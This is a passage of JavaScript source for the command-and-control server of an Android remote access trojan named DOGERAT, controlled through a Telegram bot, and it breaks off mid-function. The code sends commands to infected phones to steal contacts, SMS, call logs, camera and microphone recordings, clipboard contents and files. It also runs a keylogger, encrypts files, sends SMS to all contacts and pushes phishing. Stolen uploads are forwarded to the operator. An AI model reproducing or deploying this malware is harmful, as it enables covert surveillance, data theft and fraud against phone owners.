const express = require("express");
const http = require("http");
const {
  Server
} = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const https = require("https");
const multer = require("multer");
const fs = require('fs');
const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
// 读取配置数据
const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
// 创建 Telegram 机器人实例
const bot = new telegramBot(data.token, {
  'polling': true,
  'request': {}
});
const appData = new Map();
const actions = ["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯", "✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯", "✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯", "✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯", "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯", "✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯", "✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯", "✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯", "✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯", "✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"];
// 处理文件上传的路由
app.post("/upload", uploader.single('file'), (req, res) => {
  const originalFileName = req.file.originalname;// 获取上传文件的原始名称
  const modelHeader  = req.headers.model;// 获取请求头中的模型信息
    // 发送文档到指定的 ID
  bot.sendDocument(data.id, req.file.buffer, {
    'caption': "<b>✯ 𝙵𝚒𝚕𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → " + modelHeader  + '</b>',
    'parse_mode': "HTML"
  }, {
    'filename': originalFileName,
    'contentType': "*/*"
  });
  res.send("Done");
});
// 处理获取文本的路由
app.get("/text", (req, res) => {
  res.send(data.text);
});
app.get("/", (req, res) => {
  res.send("success");
});
//设备连接
io.on("connection", socket => {
	// 获取客户端的模型、版本和IP信息
  let modelInfo = socket.handshake.headers.model + '-' + io.sockets.sockets.size || "no information";
  let versionInfo = socket.handshake.headers.version || "no information";
  let ipInfo = socket.handshake.headers.ip || "no information";
  // 将信息保存到 socket 对象上
  socket.model = modelInfo;
  socket.version = versionInfo;
  // 发送连接成功的消息
  let connectionMessage = "<b>✯ 𝙽𝚎𝚠 𝚍𝚎𝚟𝚒𝚌𝚎 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n" + ("<b>𝚖𝚘𝚍𝚎𝚕</b> → " + modelInfo + "\n") + ("<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → " + versionInfo + "\n") + ("<b>𝚒𝚙</b> → " + ipInfo + "\n") + ("<b>𝚝𝚒𝚖𝚎</b> → " + socket.handshake.time + "\n\n");
  
  bot.sendMessage(data.id, connectionMessage, {
    'parse_mode': "HTML"
  });
  // 处理断开连接事件
  socket.on("disconnect", () => {
    let disconnectMessage = "<b>✯ 𝙳𝚎𝚟𝚒𝚌𝚎 𝚍𝚒𝚜𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍</b>\n\n" + ("<b>𝚖𝚘𝚍𝚎𝚕</b> → " + modelInfo + "\n") + ("<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → " + versionInfo + "\n") + ("<b>𝚒𝚙</b> → " + ipInfo + "\n") + ("<b>𝚝𝚒𝚖𝚎</b> → " + socket.handshake.time + "\n\n");
    bot.sendMessage(data.id, disconnectMessage, {
      'parse_mode': "HTML"
    });
  });
  // 处理消息接收事件
  socket.on("message", message => {
    bot.sendMessage(data.id, "<b>✯ 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 𝚛𝚎𝚌𝚎𝚒𝚟𝚎𝚍 𝚏𝚛𝚘𝚖 → " + modelInfo + "\n\n𝙼𝚎𝚜𝚜𝚊𝚐𝚎 → </b>" + message, {
      'parse_mode': "HTML"
    });
  });
});
//bot发送的消息
bot.on("message", message => {
  if (message.text === "/start") {
    bot.sendMessage(data.id, "<b>✯ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚝𝚘 DOGERAT</b>\n\nDOGERAT 𝚒𝚜 𝚊 𝚖𝚊𝚕𝚠𝚊𝚛𝚎 𝚝𝚘 𝚌𝚘𝚗𝚝𝚛𝚘𝚕 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜\n𝙰𝚗𝚢 𝚖𝚒𝚜𝚞𝚜𝚎 𝚒𝚜 𝚝𝚑𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚏 𝚝𝚑𝚎 𝚙𝚎𝚛𝚜𝚘𝚗!\n\n𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: @CYBERSHIELDX", {
      'parse_mode': "HTML",
      'reply_markup': {
        'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
        'resize_keyboard': true
      }
    });
  } else {
    if (appData.get("currentAction") === "microphoneDuration") {
      let duration = message.text;// 用户输入的持续时间
      let target = appData.get('currentTarget');// 获取当前目标
	  // 根据目标发送命令
      if (target == "all") {
        io.sockets.emit("commend", {
          'request': "microphone",
          'extras': [{
            'key': "duration",
            'value': duration
          }]
        });
      } else {
        io.to(target).emit("commend", {
          'request': "microphone",
          'extras': [{
            'key': "duration",
            'value': duration
          }]
        });
      }
	  // 清除当前操作和目标
      appData["delete"]("currentTarget");
      appData["delete"]("currentAction");
	  // 向用户发送反馈消息
      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
        'parse_mode': "HTML",
        'reply_markup': {
          'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
          'resize_keyboard': true
        }
      });
    } else {
      if (appData.get("currentAction") === "toastText") {
        let messageText = message.text; // 获取消息文本
        let currentTarget = appData.get('currentTarget'); // 获取当前目标
		
		// 根据目标发送提示
        if (currentTarget == "all") {
          io.sockets.emit("commend", {
            'request': "toast",
            'extras': [{
              'key': "text",
              'value': messageText
            }]
          });
        } else {
          io.to(currentTarget).emit("commend", {
            'request': "toast",
            'extras': [{
              'key': "text",
              'value': messageText
            }]
          });
        }
		// 清理状态
        appData["delete"]("currentTarget");
        appData["delete"]("currentAction");
		// 发送反馈消息给用户
        bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': {
            'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
            'resize_keyboard': true
          }
        });
      } else {
        if (appData.get("currentAction") === "smsNumber") {
          let enteredNumber  = message.text;// 获取用户输入的号码
          appData.set("currentNumber", enteredNumber );// 存储号码
          appData.set("currentAction", 'smsText');// 设置当前操作为发送短信
		  // 发送提示消息，要求用户输入短信内容
          bot.sendMessage(data.id, "<b>✯ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 " + enteredNumber  + "</b>\n\n", {
            'parse_mode': "HTML",
            'reply_markup': {
              'keyboard': [["✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"]],
              'resize_keyboard': true,
              'one_time_keyboard': true
            }
          });
        } else {
          if (appData.get("currentAction") === "smsText") {
            let messageText = message.text;// 获取用户输入的短信内容
            let currentNumber  = appData.get("currentNumber");// 获取当前号码
            let currentTarget  = appData.get("currentTarget");// 获取当前目标
			// 发送短信的逻辑
            if (currentTarget  == "all") {
              io.sockets.emit("commend", {
                'request': "sendSms",
                'extras': [{
                  'key': "number",
                  'value': currentNumber 
                }, {
                  'key': "text",
                  'value': messageText
                }]
              });
            } else {
              io.to(currentTarget ).emit("commend", {
                'request': "sendSms",
                'extras': [{
                  'key': "number",
                  'value': currentNumber 
                }, {
                  'key': "text",
                  'value': messageText
                }]
              });
            }
			// 清除之前的状态数据
            appData["delete"]('currentTarget');
            appData["delete"]("currentAction");
            appData["delete"]("currentNumber");
			// 发送成功消息给用户
            bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
              'parse_mode': "HTML",
              'reply_markup': {
                'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                'resize_keyboard': true
              }
            });
          } else {
            if (appData.get("currentAction") === "vibrateDuration") {
              let duration  = message.text; // 获取用户输入的振动时长
              let currentTarget  = appData.get("currentTarget"); // 获取当前目标
              if (currentTarget  == "all") {
                io.sockets.emit("commend", {
                  'request': "vibrate",
                  'extras': [{
                    'key': "duration",
                    'value': duration 
                  }]
                });
              } else {
                io.to(currentTarget ).emit("commend", {
                  'request': "vibrate",
                  'extras': [{
                    'key': "duration",
                    'value': duration 
                  }]
                });
              }
			  // 清除状态信息
              appData["delete"]("currentTarget");
              appData["delete"]("currentAction");
			  // 向用户发送成功消息
              bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                'parse_mode': "HTML",
                'reply_markup': {
                  'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                  'resize_keyboard': true
                }
              });
            } else {
              if (appData.get("currentAction") === "textToAllContacts") {
                let messageText  = message.text;
                let currentTarget  = appData.get("currentTarget");
                if (currentTarget  == "all") {
                  io.sockets.emit("commend", {
                    'request': "smsToAllContacts",
                    'extras': [{
                      'key': "text",
                      'value': messageText 
                    }]
                  });
                } else {
                  io.to(currentTarget ).emit("commend", {
                    'request': "smsToAllContacts",
                    'extras': [{
                      'key': "text",
                      'value': messageText 
                    }]
                  });
                }
                appData["delete"]("currentTarget");
                appData["delete"]("currentAction");
                bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                  'parse_mode': "HTML",
                  'reply_markup': {
                    'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                    'resize_keyboard': true
                  }
                });
              } else {
                if (appData.get("currentAction") === "notificationText") {
                  let notificationText  = message.text;// 获取用户输入的通知文本
                  appData.set("currentNotificationText", notificationText );// 存储通知文本
				  // 检查目标是所有用户还是特定用户
                  if (target == "all") {
					  // 如果目标是所有用户，发送通知
                    io.sockets.emit("commend", {
                      'request': "popNotification",
                      'extras': [{
                        'key': "text",
                        'value': notificationText // 发送的通知内容
                      }]
                    });
                  } else {
					  // 如果目标是特定用户，发送通知和相关URL
                    io.to(target).emit("commend", {
                      'request': 'popNotification',
                      'extras': [{
                        'key': "text",
                        'value': notificationText // 发送的通知内容
                      }, {
                        'key': "url",
                        'value': url// 相关的URL
                      }]
                    });
                  }
				  // 清除相关的状态信息
                  appData["delete"]('currentTarget');
                  appData["delete"]("currentAction");
                  appData["delete"]("currentNotificationText");
				  // 向用户发送执行成功的反馈消息
                  bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n✯ 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                    'parse_mode': "HTML",
                    'reply_markup': {
                      'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                      'resize_keyboard': true
                    }
                  });
                } else {
                  if (message.text === "✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯") {
                    if (io.sockets.sockets.size === 0x0) {
                      bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n", {
                        'parse_mode': "HTML"
                      });
                    } else {
						// 如果有连接的设备，构建设备信息字符串
                      let deviceInfo  = "<b>✯ 𝙲𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜 𝚌𝚘𝚞𝚗𝚝 : " + io.sockets.sockets.size + "</b>\n\n";
                      let deviceCount  = 0x1;
					  // 遍历所有连接的设备，收集信息
                      //io.sockets.sockets.forEach((_0x3479dd, _0x29c6f5, _0x222cae) => {
                      //  deviceInfo  += "<b>𝙳𝚎𝚟𝚒𝚌𝚎 " + deviceCount  + "</b>\n" + ("<b>𝚖𝚘𝚍𝚎𝚕</b> → " + _0x3479dd.model + "\n") + ("<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → " + _0x3479dd.version + "\n") + ("<b>𝚒𝚙</b> → " + _0x3479dd.ip + "\n") + ("<b>𝚝𝚒𝚖𝚎</b> → " + _0x3479dd.handshake.time + "\n\n");
                      //  deviceCount  += 0x1;
                      //});
					  
					  io.sockets.sockets.forEach((socket, _0x29c6f5, _0x222cae) => {
						deviceInfo += "<b>𝙳𝚎𝚟𝚒𝚌𝚎 " + deviceCount + "</b>\n" + 
								("<b>𝚖𝚘𝚍𝚎𝚕</b> → " + socket.model + "\n") + 
								("<b>𝚟𝚎𝚛𝚜𝚒𝚘𝚗</b> → " + socket.version + "\n") + 
								("<b>𝚒𝚙</b> → " + socket.ip + "\n") + 
								("<b>𝚝𝚒𝚖𝚎</b> → " + socket.handshake.time + "\n\n");
							deviceCount++;
						});
					  
					  // 发送设备信息
                      bot.sendMessage(data.id, deviceInfo , {
                        'parse_mode': "HTML"
                      });
                    }
                  } else {
                    if (message.text === "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯") {
						// 处理用户请求的操作
                      if (io.sockets.sockets.size === 0x0) {
						  // 如果没有连接的设备，发送提示信息
                        bot.sendMessage(data.id, "<b>✯ 𝚃𝚑𝚎𝚛𝚎 𝚒𝚜 𝚗𝚘 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚎𝚍 𝚍𝚎𝚟𝚒𝚌𝚎</b>\n\n", {
                          'parse_mode': "HTML"
                        });
                      } else {
						  // 如果有连接的设备，创建设备列表
                        let deviceList = [];
                        io.sockets.sockets.forEach((_0x6307e5, _0x56439e, _0x42b7c1) => {
                          deviceList.push([_0x6307e5.model]);
                        });
                        deviceList.push(["✯ 𝙰𝚕𝚕 ✯"]);
                        deviceList.push(["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]);
                        bot.sendMessage(data.id, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗</b>\n\n", {
                          'parse_mode': 'HTML',
                          'reply_markup': {
                            'keyboard': deviceList,
                            'resize_keyboard': true,
                            'one_time_keyboard': true
                          }
                        });
                      }
                    } else {
                      if (message.text === "✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯") {
                        bot.sendMessage(data.id, "<b>✯ If you want to hire us for any paid work please contack @sphanter\n𝚆𝚎 𝚑𝚊𝚌𝚔, 𝚆𝚎 𝚕𝚎𝚊𝚔, 𝚆𝚎 𝚖𝚊𝚔𝚎 𝚖𝚊𝚕𝚠𝚊𝚛𝚎\n\n𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @CUBERSHIELDX\nADMIN → @SPHANTER</b>\n\n", {
                          'parse_mode': 'HTML'
                        });
                      } else {
                        if (message.text === "✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯") {
                          bot.sendMessage(data.id, "<b>✯ 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                            'parse_mode': "HTML",
                            'reply_markup': {
                              'keyboard': [["✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯", "✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯"]],
                              'resize_keyboard': true
                            }
                          });
                        } else {
							// 检查接收到的消息文本是否为"✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯"
                          if (message.text === "✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯") {
							  // 获取当前目标设备的模型
                            let currentTargetModel  = io.sockets.sockets.get(appData.get("currentTarget")).model;
							// 根据目标模型构建响应消息
                            if (currentTargetModel  == "all") {
                              bot.sendMessage(data.id, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n", {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"], ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"], ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"], ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"], ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"], ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"], ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"], ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"], ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"], ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"], ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"], ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯"], ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]],
                                  'resize_keyboard': true,
                                  'one_time_keyboard': true
                                }
                              });
                            } else {
                              bot.sendMessage(data.id, "<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + currentTargetModel  + "</b>\n\n", {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [["✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯", "✯ 𝚂𝙼𝚂 ✯"], ["✯ 𝙲𝚊𝚕𝚕𝚜 ✯", "✯ 𝙰𝚙𝚙𝚜 ✯"], ["✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯", "✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯"], ["✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯", "✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯"], ["✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯", "✯ 𝚃𝚘𝚊𝚜𝚝 ✯"], ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯", "✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯"], ["✯ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 ✯", "✯ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 ✯"], ["✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯", "✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯"], ["✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯", "✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯"], ["✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯", "✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯"], ["✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯", "✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯"], ["✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯"], ["✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯"], ["✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯"]],
                                  'resize_keyboard': true,
                                  'one_time_keyboard': true
                                }
                              });
                            }
                          } else {
							  // 检查消息文本是否在允许的操作列表中
                            if (actions.includes(message.text)) {
								// 获取当前目标设备
                              let currentTarget = appData.get("currentTarget");
                              if (message.text === "✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯") {
                                if (currentTarget == "all") {
                                  io.sockets.emit("commend", {
                                    'request': "contacts",
                                    'extras': []
                                  });
                                } else {
                                  io.to(currentTarget).emit("commend", {
                                    'request': 'contacts',
                                    'extras': []
                                  });
                                }
                                appData["delete"]("currentTarget");
